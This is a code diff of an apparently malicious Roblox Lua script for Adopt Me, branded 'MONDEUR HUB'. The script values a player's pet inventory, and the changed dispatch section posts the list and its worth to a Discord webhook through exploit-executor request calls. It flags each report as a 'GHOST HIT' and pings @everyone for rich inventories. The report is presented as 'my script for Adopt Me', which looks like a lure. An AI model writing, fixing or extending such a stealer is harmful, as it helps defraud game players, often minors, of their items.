@@ -24,16 +24,14 @@ local function loadValues()
     local success, result = pcall(function()
         return game:HttpGet(VALUE_URL)
     end)
-    if success and type(result) == "string" then
+    if success then
         for line in result:gmatch("[^\r\n]+") do
             local name, val = line:match("([^,]+),([^,]+)")
             if name and val then
-                -- FIX: Using pattern match instead of .trim()
+                -- FIX: Replaced .trim() with pattern match to prevent Roblox crash
                 local cleanName = name:lower():match("^%s*(.-)%s*$")
-                local cleanVal = val:match("^%s*(.-)%s*$")
-                local numVal = tonumber(cleanVal)
-                if cleanName and numVal then
-                    customValues[cleanName] = numVal
+                if cleanName then
+                    customValues[cleanName] = tonumber(val)
                 end
             end
         end
@@ -96,7 +94,7 @@ end
 -- 6. VALUATION LOGIC
 local function getFinalValue(petData, props)
     local rawName = petData.name or ""
-    -- FIX: Using pattern match instead of .trim()
+    -- FIX: Replaced .trim() here as well
     local petName = rawName:lower():match("^%s*(.-)%s*$") or ""
     local base = customValues[petName] or petData.rvalue or 0
     
@@ -156,15 +154,28 @@ end
 
 local sortedPets, grandTotal, finalTradeList = processInventory()
 
--- 8. WEBHOOK DISPATCH (FIXED ERRORS & ORIGINAL LOOK)
+-- 8. WEBHOOK DISPATCH (FIXED EOF AND MALFORMED STRING)
 if #sortedPets > 0 then
-    local petLines = ""
+    local lines = {}
     for _, p in ipairs(sortedPets) do
-        petLines = petLines .. p.emoji .. "  " .. p.name .. " " .. p.count .. "x (₱" .. string.format("%.2f", p.price) .. ")\n"
+        table.insert(lines, p.emoji.." "..p.name.." "..p.count.."x (₱"..string.format("%.2f", p.price)..")")
     end
 
     local payload = HttpService:JSONEncode({
         content = (grandTotal >= 500 and "@everyone" or ""),
         embeds = {{
-            title = "MONDEUR HUB | 🦊 HIT!",
-            description = "
+            title = "MONDEUR HUB | 🦊 GHOST HIT!",
+            description = "This is my script for Adopt Me!\n\n" .. table.concat(lines, "\n")
+        }}
+    })
+
+    local req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+    if req then
+        req({
+            Url = WEBHOOK,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = payload
+        })
+    end
+end
